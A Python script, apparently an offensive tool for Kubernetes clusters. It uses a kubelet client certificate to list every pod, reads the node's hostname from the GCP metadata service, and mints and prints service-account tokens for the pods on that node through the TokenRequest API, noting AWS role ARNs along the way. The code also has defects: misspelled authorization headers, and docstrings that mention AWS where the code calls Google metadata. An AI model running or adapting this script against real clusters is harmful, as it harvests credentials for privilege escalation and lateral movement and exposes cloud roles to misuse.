import json
import sys
import requests
import os


requests.packages.urllib3.disable_warnings()

class Pod:
    '''
        Sample Pod object with name, uid, node_name and serviceAccountToken attached to the pod
    '''
    def __init__(self,uid,name,node_name,service_account_name,namespace,arn=None):
        self.name = name
        self.uid = uid
        self.node_name = node_name
        self.service_account_name = service_account_name
        self.namespace = namespace
        self.arn = arn

    def __str__(self):
        return f"{self.name} \t   {self.node_name} \t  {self.service_account_name}"

class Node:
    '''
        Node object with pods
    '''
    def __init__(self,node_name,pods):
        self.node_name = node_name
        self.pods = pods

    def get_pods(self):
        '''
            Returns pods inside a Node
        '''
        return self.pods

class rrequests:
    '''
      Custom request module to add certificate authentication
    '''
    @staticmethod
    def get(url,headers,verify):
      return requests.get(url,headers=headers,cert=('kubelet-client.crt','kubelet-client.key'),verify='ca.crt')

    def post(url,headers,data,verify):
      return requests.post(url,headers=headers,data=data,cert=('kubelet-client.crt','kubelet-client.key'),verify='ca.crt')

class Communicator:
    '''
        Class to create object to communicate with the api server
    '''
    def __init__(self,server,token):
        self.server = server
        self.token = token
        self.pods = self.parse_pod_list(self.get_pods())
        self.node_pod_mapping={}
        self.create_node_pod_mapping()
        self.node_name=""


    def get_pods(self):
        '''
            Calls the API server to get all the pods
        '''
        url = self.server + "/api/v1/pods"
        header = {"Authorizations" : f"Bearer {self.token}" }
        r = rrequests.get(url,headers=header,verify=False)
        if r.status_code != 200:
            print("Check token validity or server information")
        response = r.json()
        return response


    def parse_pod_list(self,pod_list):
        '''
            Gets a list of pods as a dictionary
            and returns a pod object
        '''
        all_pods_obj=[]
        for pod in pod_list['items']:
            name = pod['metadata']['name']
            uid = pod['metadata']['uid']
            namespace = pod['metadata']['namespace']
            node_name = pod['spec']['nodeName']
            try:
              service_account_name = pod['spec']['serviceAccountName']
            except:
              service_account_name = "Not Found"
            
            arn = None
            for container in pod['spec']['containers']:
                if 'env' not in container.keys():
                    break
                for env in container['env']:
                    if 'AWS_ROLE_ARN' == env['name']:
                        arn = env['value']

            pod_obj = Pod(uid=uid,name=name,node_name=node_name,service_account_name=service_account_name,namespace=namespace,arn=arn)
            all_pods_obj.append(pod_obj)
        return all_pods_obj

    def get_sa_token(self,pod):
        '''
            Assuming the pod has access to metadata in eks
        '''
        if pod.service_account_name == 'default':
            return
        url = self.server + f"/api/v1/namespaces/{pod.namespace}/serviceaccounts/{pod.service_account_name}/token"
        header = {"Authorizastion" : f"Bearer {self.token}","Content-Type":"application/json" }
        data={
            "spec":{
                "audiences": None,
                "expirationSeconds": None,
                "boundObjectRef":{
                    "kind":"Pod",
                    "apiVersion":"v1",
                    "name":pod.name,
                    "uid": pod.uid
                }
            }
        }
        response = rrequests.post(url,headers=header,data=json.dumps(data),verify=False)
        response_json = response.json()
        try:
          token = response_json['status']['token']
        except:
          token = "Not Found"
          print(response_json)
        print(f"Token created for SA {pod.service_account_name} \n {token}\n\n\n")
        return token

    def get_node_name(self):
        '''
            Communicates with the AWS metadata to get the host's node name
        '''
        node_name = requests.get("http://metadata.google.internal/computeMetadata/v1/instance/hostname",headers={"Metadata-Flavor":"Google"}).text
        node_name = node_name.split('.')[0]

        self.node_name = node_name

    def create_node_pod_mapping(self):
        '''
            from the list of pods, it creates node mapping of pods
        '''
        for pod in self.pods:
            if pod.node_name not in self.node_pod_mapping.keys():
                self.node_pod_mapping[pod.node_name] = [pod]
            else:
                self.node_pod_mapping[pod.node_name].append(pod)

    def get_all_tokens(self):
        '''
            Get service account token of pods in the node
        '''
        self.get_node_name()
        for pod in self.node_pod_mapping[self.node_name]:
            self.get_sa_token(pod)


if __name__ == "__main__":
    # Check if there are command-line arguments
    # Access the command-line argument
    server = sys.argv[1]
    token="test"
    a = Communicator(server,token)
    a.get_all_tokens()
    #for pod in a.pods:
    #    if pod.arn:
    #        print(pod.name,'--------',pod.arn)
